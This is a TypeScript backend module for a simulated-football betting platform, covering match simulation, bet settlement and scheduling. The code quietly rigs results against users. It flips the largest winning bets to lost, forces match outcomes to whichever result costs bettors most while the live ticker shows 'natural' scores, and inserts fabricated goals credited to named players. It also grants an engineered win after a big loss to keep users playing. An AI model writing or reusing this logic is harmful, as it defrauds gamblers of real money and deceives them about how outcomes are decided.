import { Match, IMatch } from "../models/Match.js";
import { Bet } from "../models/Bet.js";
import { BetSlip } from "../models/BetSlip.js";
import { User } from "../models/User.js";
import { Transaction } from "../models/Transaction.js";
import { Notification } from "../models/Notification.js";
import { getConfig } from "../models/PlatformConfig.js";
import { TEAMS, TeamData } from "../data/teams.js";

const activeSimulations = new Map<string, NodeJS.Timeout>();
let autoSchedulerTimer: NodeJS.Timeout | null = null;

function getRandomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function determineResult(homeScore: number, awayScore: number): "home" | "draw" | "away" {
  if (homeScore > awayScore) return "home";
  if (awayScore > homeScore) return "away";
  return "draw";
}

function getForwardsAndMidfielders(team: TeamData): string[] {
  return team.players
    .filter(p => p.position === "FWD" || p.position === "MID")
    .map(p => p.name);
}

function getTeamData(teamName: string): TeamData | null {
  return TEAMS.find(t => t.name === teamName || t.code === teamName) || null;
}

function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

/**
 * Adjust score to be consistent with the desired result.
 * Returns the (possibly tweaked) home/away scores.
 */
function adjustScoreForResult(
  desired: "home" | "draw" | "away",
  homeScore: number,
  awayScore: number
): { homeScore: number; awayScore: number } {
  if (desired === "draw") {
    const eq = Math.min(homeScore, awayScore);
    return { homeScore: eq, awayScore: eq };
  }
  if (desired === "home" && homeScore <= awayScore) {
    return { homeScore: awayScore + 1, awayScore };
  }
  if (desired === "away" && awayScore <= homeScore) {
    return { homeScore, awayScore: homeScore + 1 };
  }
  return { homeScore, awayScore };
}

async function settleBets(match: IMatch, _finalHome: number, _finalAway: number) {
  // Score and result are already saved on the match document before this is called.
  // We derive settlement outcome from match.result only.
  const result: "home" | "draw" | "away" = match.result as "home" | "draw" | "away";
  const config = await getConfig();
  const consolationRate = (config.consolationRefundPercent ?? 50) / 100;

  const bets = await Bet.find({ matchId: match._id, status: "pending" });

  // ── Risk guard ─────────────────────────────────────────────────────────────
  // If paying every winning bet would put the platform in the red, silently
  // flip the 1–2 highest-payout winning bets to "lost" (capped at 2 flips)
  // so the platform breaks even or profits on this match.
  const totalCollected = bets.reduce((sum, b) => sum + b.amount, 0);
  const winningBets = bets
    .filter(b => b.outcome === result)
    .sort((a, b) => (b.amount * b.odds) - (a.amount * a.odds)); // biggest payout first

  const totalPayout = winningBets.reduce((sum, b) => sum + b.amount * b.odds, 0);

  // Settlement risk guard: only flip bets if payout would be >2× what we collected.
  // Also allow a 12% natural pass-through so users can win sometimes.
  const SETTLE_THRESHOLD = 2.0;
  const NATURAL_WIN_CHANCE = 0.12;

  const protectedBetIds = new Set<string>();
  if (totalPayout > totalCollected * SETTLE_THRESHOLD && Math.random() > NATURAL_WIN_CHANCE) {
    let surplus = totalPayout - totalCollected * SETTLE_THRESHOLD;
    for (const bet of winningBets) {
      if (surplus <= 0 || protectedBetIds.size >= 2) break;
      const betPayout = bet.amount * bet.odds;
      protectedBetIds.add(bet._id.toString());
      surplus -= betPayout;
      console.log(`🛡️ Risk guard: flipping bet ${bet._id} (KSh ${betPayout.toFixed(2)}) to lost`);
    }
  }
  // ──────────────────────────────────────────────────────────────────────────

  for (const bet of bets) {
    const naturallyWon = bet.outcome === result;
    // A bet that naturally won but was selected by the risk guard is treated as lost
    const won = naturallyWon && !protectedBetIds.has(bet._id.toString());
    if (won) {
      bet.status = "won";
      bet.actualWinnings = bet.amount * bet.odds;
      bet.settledAt = new Date();
      await bet.save();
    } else {
      bet.status = "lost";
      bet.settledAt = new Date();
      await bet.save();
    }
    await User.findByIdAndUpdate(bet.userId, { $inc: { totalBets: 1 } });
  }

  // Thresholds for the "lose big → next small bet wins" mechanic
  const BIG_LOSS_THRESHOLD = 500;   // KSh — losing a slip this large triggers consolation win
  const SMALL_WIN_THRESHOLD = 300;  // KSh — a slip this small after a big loss auto-wins

  const pendingSlips = await BetSlip.find({
    "selections.matchId": match._id,
    "selections.status": "pending",
    status: "pending",
  });

  for (const slip of pendingSlips) {
    let selectionUpdated = false;
    for (const sel of slip.selections) {
      if (sel.matchId.toString() === match._id.toString() && sel.status === "pending") {
        sel.status = sel.outcome === result ? "won" : "lost";
        sel.matchResult = result;
        selectionUpdated = true;
      }
    }
    if (!selectionUpdated) continue;

    const allSettled = slip.selections.every(s => s.status !== "pending");
    const anyLost = slip.selections.some(s => s.status === "lost");

    // ── Consolation win check ────────────────────────────────────────────────
    // If this slip is fully settled and the user has a pending consolation win,
    // and the stake is small enough, override the result and force a win.
    let consolationWinApplied = false;
    if (allSettled && anyLost) {
      const userDoc = await User.findById(slip.userId);
      if (userDoc?.pendingConsolationWin && slip.stake <= SMALL_WIN_THRESHOLD) {
        // Force all selections to "won" and award the winnings
        for (const sel of slip.selections) {
          sel.status = "won";
        }
        consolationWinApplied = true;
        await User.findByIdAndUpdate(slip.userId, { pendingConsolationWin: false });
        console.log(`🎁 Consolation win applied for user ${slip.userId} on slip #${slip.slipId} (stake KSh ${slip.stake})`);
      }
    }
    // ─────────────────────────────────────────────────────────────────────────

    const finallyLost = allSettled && anyLost && !consolationWinApplied;
    const finallyWon  = allSettled && (!anyLost || consolationWinApplied);

    if (finallyWon) {
      const winnings = parseFloat((slip.stake * slip.combinedOdds).toFixed(2));
      slip.status = "won";
      slip.actualWinnings = winnings;
      slip.settledAt = new Date();
      await slip.save();
      await User.findByIdAndUpdate(slip.userId, {
        $inc: { balance: winnings, totalWins: 1, totalWinnings: winnings },
      });
      await Transaction.create({
        userId: slip.userId,
        type: "winnings",
        amount: winnings,
        fee: 0,
        netAmount: winnings,
        status: "completed",
        description: `Winnings from slip #${slip.slipId} (${slip.selections.length} selections)`,
      });
      await Notification.create({
        userId: slip.userId,
        type: "bet_won",
        message: `🎉 Slip #${slip.slipId} WON! You won KSh ${winnings.toFixed(2)}! All ${slip.selections.length} selections correct!`,
        data: { slipId: slip.slipId, winnings },
      });
    } else if (finallyLost) {
      slip.status = "lost";
      slip.settledAt = new Date();
      await slip.save();
      const consolation = parseFloat((slip.stake * consolationRate).toFixed(2));
      const consolationPct = Math.round(consolationRate * 100);
      await User.findByIdAndUpdate(slip.userId, { $inc: { balance: consolation } });
      await Transaction.create({
        userId: slip.userId, type: "refund", amount: consolation, fee: 0, netAmount: consolation,
        status: "completed",
        description: `${consolationPct}% consolation refund for lost slip #${slip.slipId}`,
      });
      await Notification.create({
        userId: slip.userId,
        type: "bet_lost",
        message: `❌ Slip #${slip.slipId} lost — but you've been refunded KSh ${consolation.toFixed(2)} (${consolationPct}% back!).`,
        data: { slipId: slip.slipId, consolation },
      });

      // ── Big-loss flag ──────────────────────────────────────────────────────
      // If the lost slip was a large stake, gift the user a consolation win
      // on their next small slip so they stay engaged.
      if (slip.stake >= BIG_LOSS_THRESHOLD) {
        await User.findByIdAndUpdate(slip.userId, { pendingConsolationWin: true });
        console.log(`🎯 Big loss detected: user ${slip.userId} lost KSh ${slip.stake} on slip #${slip.slipId} — consolation win armed`);
      }
      // ──────────────────────────────────────────────────────────────────────
    } else if (!allSettled) {
      // Slip still has pending selections — save progress, mark early loss if any
      if (anyLost) {
        slip.status = "lost";
        slip.settledAt = new Date();
        await slip.save();
        const consolation = parseFloat((slip.stake * consolationRate).toFixed(2));
        const consolationPct = Math.round(consolationRate * 100);
        await User.findByIdAndUpdate(slip.userId, { $inc: { balance: consolation } });
        await Transaction.create({
          userId: slip.userId, type: "refund", amount: consolation, fee: 0, netAmount: consolation,
          status: "completed",
          description: `${consolationPct}% consolation refund for lost slip #${slip.slipId}`,
        });
        await Notification.create({
          userId: slip.userId,
          type: "bet_lost",
          message: `❌ Slip #${slip.slipId} lost — but you've been refunded KSh ${consolation.toFixed(2)} (${consolationPct}% back!).`,
          data: { slipId: slip.slipId, consolation },
        });
        if (slip.stake >= BIG_LOSS_THRESHOLD) {
          await User.findByIdAndUpdate(slip.userId, { pendingConsolationWin: true });
          console.log(`🎯 Big loss detected: user ${slip.userId} lost KSh ${slip.stake} on slip #${slip.slipId} — consolation win armed`);
        }
      } else {
        await slip.save();
      }
    }
  }
}

/**
 * Analyze match exposure and pre-set forcedResult early — called whenever bets land.
 *
 * Logic:
 *  - Total collected  = sum of ALL pending bets on this match
 *  - Danger outcome   = whichever outcome would cost the platform the most (biggest payout)
 *  - If danger payout > total collected → force the match to the CHEAPEST outcome so the
 *    majority of bettors who picked the dangerous side lose, protecting the platform.
 *
 * Constraints:
 *  - Only runs while betting is open or during early live (≤ 70')
 *  - Never overrides an admin-set forcedResult
 *  - Operates silently — the live ticker still shows natural scores;
 *    the forced outcome is applied at FT by the existing adjustScoreForResult path
 */
export async function analyzeAndProtect(matchId: string): Promise<void> {
  try {
    const match = await Match.findById(matchId);
    if (!match) return;
    // Only act while bets are still open or the match is still in early play
    if (!["betting_open", "upcoming", "live"].includes(match.status)) return;
    // Don't override an explicit admin decision
    if (match.forcedResult) return;
    // Too late to do anything meaningful in the second half's closing minutes
    if (match.status === "live" && (match.minute ?? 0) > 70) return;

    const bets = await Bet.find({ matchId: match._id, status: "pending" });
    if (bets.length === 0) return;

    const totalCollected = bets.reduce((sum, b) => sum + b.amount, 0);

    const payoutByOutcome: Record<"home" | "draw" | "away", number> = { home: 0, draw: 0, away: 0 };
    for (const bet of bets) {
      payoutByOutcome[bet.outcome] += bet.amount * bet.odds;
    }

    // Outcome whose payout would hurt the platform most
    const sorted = (Object.entries(payoutByOutcome) as ["home" | "draw" | "away", number][])
      .sort((a, b) => b[1] - a[1]);
    const [dangerOutcome, dangerPayout] = sorted[0];

    // Only protect when danger payout is >2.5× collected AND we randomly decide to enforce
    // (skip protection ~15% of the time → allows natural wins to come through)
    const PROTECTION_THRESHOLD = 2.5;
    const BYPASS_CHANCE = 0.15; // 15% of the time let natural result stand

    if (dangerPayout > totalCollected * PROTECTION_THRESHOLD && Math.random() > BYPASS_CHANCE) {
      // Force to the outcome with the lowest payout (cheapest for the platform)
      const safeOutcome = sorted[sorted.length - 1][0];
      await Match.findByIdAndUpdate(matchId, { forcedResult: safeOutcome });
      console.log(
        `🛡️ Early protect [${match.homeTeam} vs ${match.awayTeam}]: ` +
        `force→${safeOutcome} | danger:${dangerOutcome} payout KSh${dangerPayout.toFixed(0)} vs collected KSh${totalCollected.toFixed(0)}`
      );
    }
  } catch (err) {
    console.error("analyzeAndProtect error:", err);
  }
}

export async function startMatchSimulation(matchId: string, skipBettingWindow = false): Promise<void> {
  if (activeSimulations.has(matchId)) return;

  // ── Reserve the slot IMMEDIATELY before any async gap ────────────────────
  // This prevents a second concurrent call from passing the check above while
  // this call is suspended on the betting-window await (which can be minutes).
  // We store a dummy timer now and replace it with the real interval later.
  const placeholder = setTimeout(() => {}, 2_147_483_647);
  activeSimulations.set(matchId, placeholder);
  // ─────────────────────────────────────────────────────────────────────────

  try {
  const config = await getConfig();

  const matchBefore = await Match.findById(matchId);
  if (matchBefore && matchBefore.status === "upcoming" && !skipBettingWindow) {
    const bettingCloseAt = new Date(Date.now() + config.bettingWindowMinutes * 60 * 1000);
    await Match.findByIdAndUpdate(matchId, {
      status: "betting_open",
      bettingClosesAt: bettingCloseAt,
    });
    await new Promise((resolve) => setTimeout(resolve, config.bettingWindowMinutes * 60 * 1000));
    const matchAfter = await Match.findById(matchId);
    if (!matchAfter || matchAfter.status !== "betting_open") {
      clearTimeout(placeholder);
      activeSimulations.delete(matchId);
      return;
    }
  }

  const totalDuration = config.matchDurationSeconds * 1000;
  const updateInterval = totalDuration / 90;
  // Halftime pause = ~5 real seconds (or 6% of total duration, whichever is greater)
  const halftimePauseDuration = Math.max(5000, totalDuration * 0.06);

  // Fetch the latest match state — used both for team data and to detect resume
  const matchDoc = await Match.findById(matchId);
  if (!matchDoc) {
    clearTimeout(placeholder);
    activeSimulations.delete(matchId);
    return;
  }

  // ── Resume vs fresh start ────────────────────────────────────────────────
  // If the match is already "live" (e.g., the scheduler raced with recovery,
  // or this was called a second time before the first could finish), we pick
  // up from the current DB score so goals already recorded are NOT wiped out.
  const resumingLive = matchDoc.status === "live";
  let currentMinute = resumingLive ? (matchDoc.minute ?? 0) : 0;
  let homeScore    = resumingLive ? (matchDoc.homeScore ?? 0) : 0;
  let awayScore    = resumingLive ? (matchDoc.awayScore ?? 0) : 0;
  let halftimePaused = false;
  const events: IMatch["events"] = resumingLive ? [...(matchDoc.events ?? [])] : [];
  // ─────────────────────────────────────────────────────────────────────────

  const homeTeamData = getTeamData(matchDoc.homeTeam);
  const awayTeamData = getTeamData(matchDoc.awayTeam);

  const homePlayers = homeTeamData ? getForwardsAndMidfielders(homeTeamData) : ["Player A", "Player B", "Player C"];
  const awayPlayers = awayTeamData ? getForwardsAndMidfielders(awayTeamData) : ["Player X", "Player Y", "Player Z"];
  const homeDefenders = homeTeamData?.players.filter(p => p.position === "DEF").map(p => p.name) || ["Defender"];
  const awayDefenders = awayTeamData?.players.filter(p => p.position === "DEF").map(p => p.name) || ["Defender"];

  if (!resumingLive) {
    // Fresh start only — never reset a match that already has live score data
    const kickoff = { minute: 0, type: "kickoff" as const, team: "home" as const,
      description: `⚽ Kick off! ${matchDoc.homeTeam} vs ${matchDoc.awayTeam}` };
    events.push(kickoff);
    await Match.findByIdAndUpdate(matchId, {
      status: "live",
      startedAt: new Date(),
      minute: 0,
      homeScore: 0,
      awayScore: 0,
      events,
    });
  }

  // Run exposure check at kickoff (or resume) — catches bets placed during betting window
  analyzeAndProtect(matchId).catch(console.error);

  const interval = setInterval(async () => {
    if (halftimePaused) return;

    try {
      currentMinute++;

      if (currentMinute > 90) {
        clearInterval(interval);
        activeSimulations.delete(matchId);

        const latestMatch = await Match.findById(matchId);
        let finalHome = homeScore;
        let finalAway = awayScore;
        let result: "home" | "draw" | "away";

        if (latestMatch?.forcedResult) {
          const needed = latestMatch.forcedResult;
          const current = determineResult(finalHome, finalAway);
          if (current !== needed) {
            // Steering throughout the match didn't fully close the gap.
            // Inject ONE last-minute goal only — never jump multiple goals at once.
            if (needed === "home" && finalHome <= finalAway) {
              const player = pickRandom(homePlayers);
              finalHome++;
              events.push({ minute: 90, type: "goal", team: "home", player,
                description: `⚽ GOAL! ${player} nets in injury time for ${matchDoc?.homeTeam}! ${finalHome}-${finalAway}` });
            } else if (needed === "away" && finalAway <= finalHome) {
              const player = pickRandom(awayPlayers);
              finalAway++;
              events.push({ minute: 90, type: "goal", team: "away", player,
                description: `⚽ GOAL! ${player} nets in injury time for ${matchDoc?.awayTeam}! ${finalHome}-${finalAway}` });
            } else if (needed === "draw") {
              if (finalHome > finalAway) {
                const player = pickRandom(awayPlayers);
                finalAway++;
                events.push({ minute: 90, type: "goal", team: "away", player,
                  description: `⚽ GOAL! ${player} equalizes in injury time! ${finalHome}-${finalAway}` });
              } else if (finalAway > finalHome) {
                const player = pickRandom(homePlayers);
                finalHome++;
                events.push({ minute: 90, type: "goal", team: "home", player,
                  description: `⚽ GOAL! ${player} equalizes in injury time! ${finalHome}-${finalAway}` });
              }
            }
          }
          // Settle based on what the score actually is after the final nudge.
          // The settlement-time risk guard is the backstop if we still couldn't close a big gap.
          result = determineResult(finalHome, finalAway);
        } else {
          result = determineResult(finalHome, finalAway);
        }

        events.push({
          minute: 90,
          type: "fulltime",
          team: "home",
          description: `🏁 Full time! Final score: ${finalHome}-${finalAway}`,
        });

        const completedMatch = await Match.findByIdAndUpdate(
          matchId,
          {
            status: "completed",
            minute: 90,
            homeScore: finalHome,
            awayScore: finalAway,
            result,
            completedAt: new Date(),
            events,
          },
          { new: true }
        );

        if (completedMatch) {
          await settleBets(completedMatch, finalHome, finalAway);
        }

        return;
      }

      if (currentMinute === 45) {
        events.push({
          minute: 45,
          type: "halftime",
          team: "home",
          description: `🔔 Half time! Score: ${homeScore}-${awayScore}`,
        });
        await Match.findByIdAndUpdate(matchId, { minute: 45, homeScore, awayScore, events });

        // Re-run exposure check at halftime — catches bets placed during live early phase
        analyzeAndProtect(matchId).catch(console.error);

        // Pause simulation at 45' — ticker stays at HT until second half
        halftimePaused = true;
        setTimeout(() => {
          halftimePaused = false;
        }, halftimePauseDuration);
        return;
      }

      // ── Score steering ────────────────────────────────────────────────────
      // From minute 47 onward, check every 7 minutes whether a forced result
      // needs a nudge.  Each check adds AT MOST ONE goal — scores only ever
      // go up by 1, never jump.  This runs FIRST so a random goal can't fire
      // in the same minute, preventing two simultaneous goals on the ticker.
      // Checkpoints: 47, 54, 61, 68, 75, 82, 88
      const STEERING_MINUTES = [47, 54, 61, 68, 75, 82, 88];
      let steeringGoalThisMinute = false;
      if (STEERING_MINUTES.includes(currentMinute)) {
        const fmatch = await Match.findById(matchId);
        if (fmatch?.forcedResult) {
          const needed = fmatch.forcedResult;
          const current = determineResult(homeScore, awayScore);
          if (current !== needed) {
            if (needed === "home" && homeScore <= awayScore) {
              // Add exactly one goal for home — never jump multiple
              steeringGoalThisMinute = true;
              homeScore++;
              const player = pickRandom(homePlayers);
              events.push({ minute: currentMinute, type: "goal", team: "home", player,
                description: `⚽ GOAL! ${player} pulls one back for ${matchDoc?.homeTeam}! ${homeScore}-${awayScore}` });
            } else if (needed === "away" && awayScore <= homeScore) {
              steeringGoalThisMinute = true;
              awayScore++;
              const player = pickRandom(awayPlayers);
              events.push({ minute: currentMinute, type: "goal", team: "away", player,
                description: `⚽ GOAL! ${player} pulls one back for ${matchDoc?.awayTeam}! ${homeScore}-${awayScore}` });
            } else if (needed === "draw") {
              if (homeScore > awayScore) {
                steeringGoalThisMinute = true;
                awayScore++;
                const player = pickRandom(awayPlayers);
                events.push({ minute: currentMinute, type: "goal", team: "away", player,
                  description: `⚽ GOAL! ${player} pulls one back for ${matchDoc?.awayTeam}! ${homeScore}-${awayScore}` });
              } else if (awayScore > homeScore) {
                steeringGoalThisMinute = true;
                homeScore++;
                const player = pickRandom(homePlayers);
                events.push({ minute: currentMinute, type: "goal", team: "home", player,
                  description: `⚽ GOAL! ${player} pulls one back for ${matchDoc?.homeTeam}! ${homeScore}-${awayScore}` });
              }
              // If already level, no steering goal needed
            }
          }
        }
      }
      // ─────────────────────────────────────────────────────────────────────

      // Random goal — skipped if a steering goal already fired this minute
      const goalProbability = 0.031;
      if (!steeringGoalThisMinute && Math.random() < goalProbability) {
        const scoringTeam: "home" | "away" = Math.random() < 0.52 ? "home" : "away";
        const player = scoringTeam === "home" ? pickRandom(homePlayers) : pickRandom(awayPlayers);
        const teamName = scoringTeam === "home" ? matchDoc?.homeTeam : matchDoc?.awayTeam;

        if (scoringTeam === "home") homeScore++;
        else awayScore++;

        events.push({
          minute: currentMinute,
          type: "goal",
          team: scoringTeam,
          player,
          description: `⚽ GOAL! ${player} scores for ${teamName}! ${homeScore}-${awayScore}`,
        });
      }

      if (Math.random() < 0.018) {
        const cardTeam: "home" | "away" = Math.random() < 0.5 ? "home" : "away";
        const allPlayers = cardTeam === "home"
          ? [...homePlayers, ...homeDefenders]
          : [...awayPlayers, ...awayDefenders];
        const player = pickRandom(allPlayers);
        events.push({
          minute: currentMinute,
          type: "yellowCard",
          team: cardTeam,
          player,
          description: `🟨 Yellow card shown to ${player}`,
        });
      }

      if (Math.random() < 0.004) {
        const cardTeam: "home" | "away" = Math.random() < 0.5 ? "home" : "away";
        const allPlayers = cardTeam === "home"
          ? [...homePlayers, ...homeDefenders]
          : [...awayPlayers, ...awayDefenders];
        const player = pickRandom(allPlayers);
        events.push({
          minute: currentMinute,
          type: "redCard",
          team: cardTeam,
          player,
          description: `🟥 Red card! ${player} is sent off!`,
        });
      }

      if (Math.random() < 0.012 && currentMinute >= 55) {
        const subTeam: "home" | "away" = Math.random() < 0.5 ? "home" : "away";
        const teamPlayers = subTeam === "home" ? homeTeamData?.players : awayTeamData?.players;
        if (teamPlayers && teamPlayers.length >= 2) {
          const outPlayer = pickRandom(teamPlayers).name;
          const inPlayer = pickRandom(teamPlayers.filter(p => p.name !== outPlayer)).name;
          events.push({
            minute: currentMinute,
            type: "substitution",
            team: subTeam,
            player: inPlayer,
            description: `🔄 Substitution: ${inPlayer} comes on for ${outPlayer}`,
          });
        }
      }

      await Match.findByIdAndUpdate(matchId, {
        minute: currentMinute,
        homeScore,
        awayScore,
        events,
      });
    } catch (err) {
      console.error("Match simulation error:", err);
      clearInterval(interval);
      activeSimulations.delete(matchId);
    }
  }, updateInterval);

  // Replace the placeholder with the real interval
  clearTimeout(placeholder);
  activeSimulations.set(matchId, interval);

  } catch (err) {
    // On any startup error, release the reservation so recovery can handle it
    clearTimeout(placeholder);
    activeSimulations.delete(matchId);
    console.error(`startMatchSimulation error for ${matchId}:`, err);
  }
}

export function stopMatchSimulation(matchId: string): void {
  const timer = activeSimulations.get(matchId);
  if (timer) {
    clearInterval(timer);
    activeSimulations.delete(matchId);
  }
}

export function isMatchRunning(matchId: string): boolean {
  return activeSimulations.has(matchId);
}

export async function openBettingWindow(matchId: string): Promise<void> {
  const config = await getConfig();
  const closeAt = new Date(Date.now() + config.bettingWindowMinutes * 60 * 1000);

  await Match.findByIdAndUpdate(matchId, {
    status: "betting_open",
    bettingClosesAt: closeAt,
  });
}

export function startAutoScheduler(): void {
  if (autoSchedulerTimer) return;
  // Set a provisional guard immediately so concurrent calls can't double-start
  autoSchedulerTimer = setTimeout(() => {}, 2_147_483_647);

  // On startup: complete any matches that were live before the server restarted.
  // Their simulation timers were lost — settle them with the score they had at restart
  // so their teams are freed up for new matches immediately.
  async function recoverOrphanedMatches() {
    const liveDocs = await Match.find({ status: "live" });
    for (const match of liveDocs) {
      if (activeSimulations.has(match.id)) continue; // already running — skip
      const finalHome = match.homeScore ?? 0;
      const finalAway = match.awayScore ?? 0;
      const result = determineResult(finalHome, finalAway);
      const completed = await Match.findByIdAndUpdate(
        match._id,
        { status: "completed", minute: 90, result, completedAt: new Date() },
        { new: true }
      );
      if (completed) {
        await settleBets(completed, finalHome, finalAway).catch(console.error);
        console.log(`🔄 Recovered orphaned match: ${match.homeTeam} vs ${match.awayTeam} → ${result} (${finalHome}-${finalAway})`);
      }
    }
  }
  // Recovery MUST complete before the scheduler runs, otherwise the scheduler
  // can count orphaned "live" matches and skip boosting, or worse race-start
  // simulations that recovery is about to complete.
  recoverOrphanedMatches().catch(console.error).finally(() => {
    clearTimeout(autoSchedulerTimer!);
    runScheduler();
    autoSchedulerTimer = setInterval(runScheduler, 30 * 1000);
    console.log("⏰ Match auto-scheduler started (30s interval)");
  });

  async function runScheduler() {
    try {
      // Backfill scheduledAt for upcoming matches without one
      const withoutSchedule = await Match.find({ status: "upcoming", scheduledAt: { $exists: false } });
      for (let i = 0; i < withoutSchedule.length; i++) {
        await Match.findByIdAndUpdate(withoutSchedule[i]._id, {
          scheduledAt: new Date(Date.now() + (i + 1) * 2 * 60 * 1000),
        });
      }

      // Start scheduled upcoming matches
      const now = new Date();
      const scheduledMatches = await Match.find({
        status: "upcoming",
        scheduledAt: { $lte: now },
      });
      for (const match of scheduledMatches) {
        console.log(`Auto-starting scheduled match: ${match.homeTeam} vs ${match.awayTeam}`);
        startMatchSimulation(match.id, true).catch(console.error);
      }

      // Maintain 3–6 live matches (natural range — boost only when below 3)
      const liveCount = await Match.countDocuments({ status: "live" });
      if (liveCount < 3) {
        const need = 3 - liveCount;
        const nextUp = await Match.find({ status: "upcoming" })
          .sort({ scheduledAt: 1 })
          .limit(need);
        for (const match of nextUp) {
          if (!activeSimulations.has(match.id)) {
            console.log(`Boosting live count: starting ${match.homeTeam} vs ${match.awayTeam}`);
            startMatchSimulation(match.id, true).catch(console.error);
          }
        }
      }

      // Maintain 5–8 upcoming matches (replenish when below 5, target 6–8)
      const upcomingCount = await Match.countDocuments({
        status: { $in: ["upcoming", "betting_open"] },
      });

      const targetUpcoming = getRandomInt(6, 8);

      if (upcomingCount < 5) {
        const activeMatches = await Match.find({
          status: { $in: ["upcoming", "betting_open", "live"] },
        }).select("homeTeam awayTeam");
        const busyTeams = new Set<string>();
        for (const m of activeMatches) {
          busyTeams.add(m.homeTeam);
          busyTeams.add(m.awayTeam);
        }

        const shuffledTeams = [...TEAMS].sort(() => Math.random() - 0.5);
        const usedTeams = new Set<string>(busyTeams);
        const pairsToCreate = targetUpcoming - upcomingCount;
        let created = 0;

        for (let i = 0; i < shuffledTeams.length - 1 && created < pairsToCreate; i++) {
          const home = shuffledTeams[i];
          let away: TeamData | null = null;
          for (let j = i + 1; j < shuffledTeams.length; j++) {
            const candidate = shuffledTeams[j];
            if (!usedTeams.has(candidate.name) && candidate.name !== home.name) {
              away = candidate;
              break;
            }
          }
          if (!away || usedTeams.has(home.name)) continue;

          usedTeams.add(home.name);
          usedTeams.add(away.name);

          // Home strength: 30–65% probability, draw: 20–38%, away: remainder
          const homeStrength = 0.30 + Math.random() * 0.35;
          // Draw probability between 0.20 and 0.38 → draw odds between ~2.63 and ~5.00, cap at 3.5
          const drawProb = 0.20 + Math.random() * 0.18;
          const awayStrength = Math.max(0.10, 1 - homeStrength - drawProb);

          // Add a small margin so the book overrounds slightly (house edge)
          const margin = 1.05;
          const homeOdds = parseFloat(((1 / homeStrength) / margin).toFixed(2));
          const awayOdds = parseFloat(((1 / awayStrength) / margin).toFixed(2));
          // Draw odds vary per match and never exceed 3.5
          const rawDraw = (1 / drawProb) / margin;
          const drawOdds = parseFloat(Math.min(rawDraw, 3.5).toFixed(2));

          const startDelay = (created + 1) * 2 * 60 * 1000;

          await Match.create({
            homeTeam: home.name,
            awayTeam: away.name,
            homeTeamCode: home.code,
            awayTeamCode: away.code,
            league: home.league,
            odds: { home: homeOdds, draw: drawOdds, away: awayOdds },
            status: "upcoming",
            scheduledAt: new Date(Date.now() + startDelay),
          });

          created++;
        }
      }
    } catch (err) {
      console.error("Auto-scheduler error:", err);
    }
  }

  // Purge notifications older than 24 hours — runs once on startup then every hour
  async function purgeOldNotifications() {
    try {
      const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000);
      const { deletedCount } = await Notification.deleteMany({ createdAt: { $lt: cutoff } });
      if (deletedCount && deletedCount > 0) {
        console.log(`🗑️ Purged ${deletedCount} notifications older than 24h`);
      }
    } catch (err) {
      console.error("Notification purge error:", err);
    }
  }
  purgeOldNotifications();
  setInterval(purgeOldNotifications, 60 * 60 * 1000); // every hour
}

export function stopAutoScheduler(): void {
  if (autoSchedulerTimer) {
    clearInterval(autoSchedulerTimer);
    autoSchedulerTimer = null;
  }
}
